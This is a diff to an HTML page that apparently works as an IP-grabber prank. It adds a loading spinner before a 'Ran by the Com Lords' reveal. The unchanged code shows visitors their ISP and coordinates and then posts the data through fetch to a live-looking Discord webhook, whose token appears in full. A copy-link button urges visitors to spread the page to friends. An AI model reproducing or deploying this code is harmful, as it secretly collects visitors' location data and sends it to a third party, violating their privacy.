@@ -148,16 +148,22 @@
 
     #data-content { display: block; }
 
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to   { opacity: 1; transform: translateY(0); }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
 <div class="wrapper">
 
-  <div class="reveal-header">
+  <!-- Loading Screen -->
+  <div id="phase-loading" style="display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:80vh; text-align:center;">
+    <div style="width:56px; height:56px; border:3px solid #3a0000; border-top-color:#ff2222; border-radius:50%; animation:spin 0.9s linear infinite; margin-bottom:1.5rem;"></div>
+    <p style="font-size:0.75rem; letter-spacing:0.15em; color:#991111;">LOADING...</p>
+  </div>
+
+  <!-- Reveal -->
+  <div id="phase-reveal" style="display:none;">
     <h1 class="reveal-title">Ran by the <em>Com Lords</em></h1>
     <p class="reveal-subtitle">Made By Raiden</p>
   </div>
@@ -196,6 +202,8 @@
 
     <button class="share-btn" onclick="copyLink()">&#10006; &nbsp;COPY LINK TO SEND TO A FRIEND</button>
   </div>
+
+  </div><!-- end phase-reveal -->
 
 </div>
 
@@ -243,6 +251,9 @@
     document.getElementById('out-isp').textContent    = data.isp || '—';
     document.getElementById('out-coords').textContent = data.lat + ', ' + data.lon;
 
+    document.getElementById('phase-loading').style.display = 'none';
+    document.getElementById('phase-reveal').style.display = 'block';
+
 
 
     fetch('https://discord.com/api/webhooks/1485458712968822784/-HmSSxfpKDqcQclV31xTSf-nsy4KlMohaYHXhfFLwcYOz23sTAxHA3UxYKYWaTXeBblS', {
@@ -274,7 +285,7 @@
   function copyLink() {
     navigator.clipboard.writeText(location.href).then(() => {
       const btn = document.querySelector('.share-btn');
-      btn.textContent = '✓  LINK COPIED — GO GET 'EM';
+      btn.textContent = '✓  LINK COPIED — GO GET EM';
       setTimeout(() => { btn.textContent = '⎘  COPY LINK TO SEND TO A FRIEND'; }, 2500);
     });
   }
